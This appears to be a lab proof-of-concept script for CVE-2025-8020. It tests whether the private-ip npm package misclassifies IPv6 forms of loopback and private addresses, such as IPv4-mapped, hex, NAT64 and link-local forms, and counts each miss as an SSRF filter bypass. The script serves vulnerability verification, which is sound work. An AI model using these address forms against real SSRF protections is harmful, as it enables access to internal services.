// private-ip — PI-01: SSRF filter bypass via IPv6 representation.
// CVE-2025-8020.
//
// A SSRF-protection middleware uses private-ip() to decide whether a
// given IP is private. If private-ip returns false for an internal
// IPv6 address, the middleware will let the request through.
//
// This PoC tests a battery of IPv6 representations that should be
// classified as loopback/private but historically are not (per the
// CVE-2025-8020 advisory: missing coverage for unusual/legacy IPv6
// formats that Node's net.isIP accepts).
import isPrivate from "private-ip";
import { readFileSync } from "node:fs";
const pkg = JSON.parse(readFileSync("/lab/node_modules/private-ip/package.json", "utf8"));

const cases = [
  // [label, ip, expected_private, vulnerability-meaning]
  ["::1 (standard loopback)",          "::1",            true,  "the canonical IPv6 loopback — MUST be private"],
  ["::ffff:127.0.0.1 (IPv4-mapped)",   "::ffff:127.0.0.1", true,  "IPv4-mapped loopback — MUST be private"],
  ["::ffff:7f00:1 (hex IPv4-mapped)",  "::ffff:7f00:1",   true,  "IPv4-mapped loopback in hex — MUST be private"],
  ["64:ff9b::127.0.0.1 (NAT64)",        "64:ff9b::127.0.0.1", true,  "NAT64 well-known prefix — MUST be private"],
  ["::ffff:0:127.0.0.1",               "::ffff:0:127.0.0.1", true,  "alternate IPv4-mapped form — MUST be private"],
  ["::2 (deprecated)",                 "::2",            true,  "deprecated IPv6 unicast"],
  ["fe80::1 (link-local)",             "fe80::1",        true,  "link-local — MUST be private"],
  ["fc00::1 (ULA)",                    "fc00::1",        true,  "unique local — MUST be private"],
  ["fd00::1 (ULA)",                    "fd00::1",        true,  "unique local — MUST be private"],
  ["8.8.8.8 (public)",                 "8.8.8.8",        false, "public — must NOT be private"],
  ["2606:4700:4700::1111 (public)",    "2606:4700:4700::1111", false, "public Cloudflare DNS — must NOT be private"],
];

let bypasses = 0;
console.log("private-ip PoC — version:", pkg.version);
console.log();
console.log("ip".padEnd(40) + "got".padEnd(8) + "expected".padEnd(10) + "verdict");
console.log("-".repeat(80));
for (const [label, ip, expected, meaning] of cases) {
  let got;
  try { got = isPrivate(ip); } catch (e) { got = `THROW(${e.message})`; }
  const verdict = (got === expected) ? "OK" : "BYPASS";
  if (verdict === "BYPASS" && expected === true) {
    bypasses++;
    console.log(`${ip.padEnd(40)}${String(got).padEnd(8)}${String(expected).padEnd(10)}${verdict}  ← ${meaning}`);
  } else {
    console.log(`${ip.padEnd(40)}${String(got).padEnd(8)}${String(expected).padEnd(10)}${verdict}`);
  }
}
console.log();
console.log(`=== RESULT: ${bypasses} bypass(es) — private IP treated as public ===`);
process.exit(bypasses > 0 ? 0 : 1);
